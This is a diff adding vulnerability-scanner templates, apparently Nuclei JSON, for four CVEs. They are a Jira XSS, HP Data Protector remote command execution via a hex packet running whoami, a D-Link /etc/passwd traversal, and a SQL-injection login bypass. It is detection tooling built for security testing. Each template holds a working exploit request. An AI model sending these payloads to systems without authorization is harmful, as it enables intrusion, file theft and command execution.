@@ -37,6 +37,47 @@
       ]
     },
     {
+      "id": "CVE-2007-0885",
+      "info": {
+        "author": "geeknik",
+        "description": "Cross-site scripting (XSS) vulnerability in jira/secure/BrowseProject.jspa in Rainbow with the Zen (Rainbow.Zen) extension allows remote attackers to inject arbitrary web script or HTML via the id parameter.",
+        "name": "Rainbow.Zen Jira XSS",
+        "reference": "https://www.securityfocus.com/archive/1/459590/100/0/threaded",
+        "severity": "medium",
+        "tags": "cve,cve2007,jira,xss"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "type": "word",
+              "words": [
+                "\"><script>alert('{{randstr}}')</script>"
+              ]
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            },
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "text/html"
+              ]
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/jira/secure/BrowseProject.jspa?id=\"><script>alert('{{randstr}}')</script>"
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2007-4556",
       "info": {
         "author": "pikpikcu",
@@ -3104,6 +3145,39 @@
       ]
     },
     {
+      "id": "CVE-2016-2004",
+      "info": {
+        "author": "pussycat0x",
+        "description": "HPE Data Protector before 7.03_108, 8.x before 8.15, and 9.x before 9.06 allow remote attackers to execute arbitrary code via unspecified vectors related to lack of authentication. This vulnerability exists because of an incomplete fix for CVE-2014-2623.",
+        "name": "HP Data Protector A.09.00 - Arbitrary Command Execution",
+        "reference": "- https://www.exploit-db.com/exploits/39858\n- https://nvd.nist.gov/vuln/detail/CVE-2016-2004\n",
+        "severity": "critical",
+        "tags": "cve,cve2016,network,iot,hp,rce"
+      },
+      "network": [
+        {
+          "host": [
+            "{{Hostname}}:5555"
+          ],
+          "inputs": [
+            {
+              "data": "00000034320001010101010100010001000100010100203238005c7065726c2e65786500202d6573797374656d282777686f616d69272900",
+              "type": "hex"
+            }
+          ],
+          "matchers": [
+            {
+              "encoding": "hex",
+              "type": "word",
+              "words": [
+                "00000034fffe3900000020006e007400200061007500740068006f0072006900740079005c00730079007300740065006d000a0000000000"
+              ]
+            }
+          ]
+        }
+      ]
+    },
+    {
       "id": "CVE-2016-3081",
       "info": {
         "author": "dhiyaneshDK",
@@ -5125,6 +5199,40 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/global-protect/login.esp?user=j%22;-alert(1)-%22x"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2018-10822",
+      "info": {
+        "author": "daffainfo",
+        "description": "Directory traversal vulnerability in the web interface on D-Link routers DWR-116 through 1.06, DIR-140L through 1.02, DIR-640L through 1.02,DWR-512 through 2.02,DWR-712 through 2.02,DWR-912 through 2.02, DWR-921 through 2.02, DWR-111 through 1.01, and probably others with the same type of firmware allows remote attackers to read arbitrary files via a /.. or // after “GET /uir” in an HTTP request.",
+        "name": "D-Link Routers - Directory Traversal",
+        "reference": "- https://www.exploit-db.com/exploits/45678\n- https://nvd.nist.gov/vuln/detail/CVE-2018-10822\n",
+        "severity": "high",
+        "tags": "cve,cve2018,lfi,router,dlink"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "regex": [
+                "root:.*:0:0"
+              ],
+              "type": "regex"
+            },
+            {
+              "status": [
+                200
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "method": "GET",
+          "path": [
+            "{{BaseURL}}/uir//etc/passwd"
           ]
         }
       ]
@@ -14228,6 +14336,40 @@
           "method": "GET",
           "path": [
             "{{BaseURL}}/_next/static/../server/pages-manifest.json"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "CVE-2020-5307",
+      "info": {
+        "author": "gy741",
+        "description": "PHPGurukul Dairy Farm Shop Management System 1.0 is vulnerable to SQL injection, as demonstrated by the username parameter in index.php, the category and CategoryCode parameters in add-category.php, the CompanyName parameter in add-company.php, and the ProductName and ProductPrice parameters in add-product.php.",
+        "name": "Dairy Farm Shop Management System - SQL Injection",
+        "reference": "- https://cinzinga.com/CVE-2020-5307-5308/\n",
+        "severity": "critical",
+        "tags": "cve,cve2020,sqli"
+      },
+      "requests": [
+        {
+          "matchers": [
+            {
+              "part": "header",
+              "type": "word",
+              "words": [
+                "add-category.php"
+              ]
+            },
+            {
+              "status": [
+                302
+              ],
+              "type": "status"
+            }
+          ],
+          "matchers-condition": "and",
+          "raw": [
+            "POST /dfsms/ HTTP/1.1\nHost: {{Hostname}}\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\nConnection: close\nContent-Length: 66\n\nusername=admin%27+or+%271%27+%3D+%271%27%3B+--+-&password=A&login=\n"
           ]
         }
       ]
